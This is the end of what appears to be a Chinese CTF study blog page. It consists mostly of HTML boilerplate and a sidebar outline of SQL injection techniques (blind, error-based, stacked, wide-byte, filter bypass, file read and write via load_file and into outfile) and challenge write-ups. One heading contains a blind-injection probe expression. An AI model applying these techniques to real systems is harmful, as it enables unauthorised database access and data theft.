        data-a=''
        data-d='false'
    >查看评论</div>


    </div>
    
        <div class='side'>
			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">1.1.</span> <span class="toc-text">测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">检测闭合方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%A2%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94-SQL-%E7%9B%B2%E6%B3%A8-%EF%BC%88%E9%A1%B5%E9%9D%A2%E4%BB%85%E6%98%BE%E7%A4%BA%E6%AD%A3%E7%A1%AE%E4%B8%8E%E4%B8%8D%E6%AD%A3%E7%A1%AE%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">•基于布尔 SQL 盲注 （页面仅显示正确与不正确）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2left"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">▲left</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2ascii-substr"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">▲ascii() substr()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2ascii-substr-select-database-1-1-98"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">▲ascii(substr((select database()),1,1))&#x3D;98</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2ord-mid"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">▲ord() mid()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2regexp-%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">▲regexp 正则注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2like"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">▲like</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%A2%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84-SQL-%E7%9B%B2%E6%B3%A8-%EF%BC%88%E9%A1%B5%E9%9D%A2%E4%BC%9A%E7%88%86%E5%87%BA%E7%9B%B8%E5%85%B3%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">•基于报错的 SQL 盲注 （页面会爆出相关语法错误）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2floor"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">▲floor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2-double-%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E8%B6%85%E5%87%BA%E8%8C%83%E5%9B%B4%E8%BF%9B%E8%A1%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">▲ double 数值类型超出范围进行报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2%E5%8F%8C%E6%B3%A8"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">▲双注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2bigint"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">▲bigint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2extractvalue"><span class="toc-number">1.4.1.5.</span> <span class="toc-text">▲extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2updatexml"><span class="toc-number">1.4.1.6.</span> <span class="toc-text">▲updatexml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2%E9%87%8D%E5%A4%8D%E6%80%A7"><span class="toc-number">1.4.1.7.</span> <span class="toc-text">▲重复性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%A2%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84-SQL-%E7%9B%B2%E6%B3%A8%EF%BC%88%E9%80%82%E5%90%88%E5%A4%A7%E5%A4%9A%E6%83%85%E5%86%B5%EF%BC%8C%E9%A1%B5%E9%9D%A2%E6%B2%A1%E5%8F%98%E5%8C%96%EF%BC%89"><span class="toc-number">1.4.2.</span> <span class="toc-text">•基于时间的 SQL 盲注（适合大多情况，页面没变化）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2sleep"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">▲sleep</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%96%B2BENCHMARK"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">▲BENCHMARK</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">异或注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%85%B3%E9%94%AE%E5%AD%97%EF%BC%9Aand%E3%80%81or%E8%BF%87%E6%BB%A4%E4%BA%86%E9%80%97%E5%8F%B7%EF%BC%8C%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">过滤了关键字：and、or过滤了逗号，过滤了空格</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.</span> <span class="toc-text">order by盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">1.8.</span> <span class="toc-text">无列名注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sys-schema-auto-increment-columns"><span class="toc-number">1.8.1.</span> <span class="toc-text">sys.schema_auto_increment_columns</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sys-schema-table-statistics-with-buffer"><span class="toc-number">1.8.2.</span> <span class="toc-text">sys.schema_table_statistics_with_buffer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-innodb-table-stats"><span class="toc-number">1.8.3.</span> <span class="toc-text">mysql.innodb_table_stats</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sys-x-schema-table-statistics"><span class="toc-number">1.8.4.</span> <span class="toc-text">sys.x$schema_table_statistics</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E6%9F%A5%E8%AF%A2%E7%BB%95%E8%BF%87"><span class="toc-number">1.8.5.</span> <span class="toc-text">子查询绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#join%E7%88%86%E7%A0%B4%E5%88%97%E5%90%8D"><span class="toc-number">1.8.6.</span> <span class="toc-text">join爆破列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%90%E5%AD%97%E7%AC%A6%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE"><span class="toc-number">1.8.7.</span> <span class="toc-text">逐字符检索数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.9.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C%E7%9A%84%E8%AE%B2%E8%A7%A3"><span class="toc-number">1.10.</span> <span class="toc-text">导入导出相关操作的讲解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81load-file-%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6"><span class="toc-number">1.10.1.</span> <span class="toc-text">1、load_file()导出文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.10.2.</span> <span class="toc-text">2、文件导入到数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%AF%BC%E5%85%A5%E5%88%B0%E6%96%87%E4%BB%B6"><span class="toc-number">1.10.3.</span> <span class="toc-text">3、导入到文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E5%85%A8"><span class="toc-number">1.11.</span> <span class="toc-text">sql注入绕过大全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.12.</span> <span class="toc-text">注入流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#boolean%E6%B3%A8%E5%85%A5"><span class="toc-number">1.13.</span> <span class="toc-text">boolean注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-1"><span class="toc-number">1.14.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.15.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.16.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BD%AC%E4%B9%89%E5%87%BD%E6%95%B0"><span class="toc-number">1.17.</span> <span class="toc-text">转义函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#or-and-%E8%BF%87%E6%BB%A4"><span class="toc-number">1.18.</span> <span class="toc-text">or and 过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E4%B8%A4%E5%B1%82%EF%BC%89%E6%9E%B6%E6%9E%84"><span class="toc-number">1.19.</span> <span class="toc-text">服务器（两层）架构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by-%E5%90%8E%E7%9A%84-injectio"><span class="toc-number">1.20.</span> <span class="toc-text">order by 后的 injectio</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89order-by-%E5%90%8E%E7%9A%84%E6%95%B0%E5%AD%97%E5%8F%AF%E4%BB%A5%E4%BD%9C%E4%B8%BA%E4%B8%80%E4%B8%AA%E6%B3%A8%E5%85%A5%E7%82%B9%E3%80%82"><span class="toc-number">1.20.1.</span> <span class="toc-text">（1）order by 后的数字可以作为一个注入点。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89procedure-analyse-%E5%8F%82%E6%95%B0%E5%90%8E%E6%B3%A8%E5%85%A5"><span class="toc-number">1.20.2.</span> <span class="toc-text">（2）procedure analyse 参数后注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6-into-outfile-%E5%8F%82%E6%95%B0"><span class="toc-number">1.20.3.</span> <span class="toc-text">（3）导入导出文件 into outfile 参数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-number">1.21.</span> <span class="toc-text">脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">1.22.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E5%B7%A7"><span class="toc-number">1.23.</span> <span class="toc-text">技巧</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb1"><span class="toc-number">2.1.</span> <span class="toc-text">[CISCN2019 总决赛 Day2 Web1]Easyweb1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#-2"><span class="toc-number">3.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-supersqli"><span class="toc-number">3.1.</span> <span class="toc-text">攻防世界-supersqli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment1"><span class="toc-number">3.2.</span> <span class="toc-text">[网鼎杯 2018]Comment1</span></a></li></ol></li></ol>	
        </div>
    
</div>


    </div>
</div>
</body>

<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>






</html>
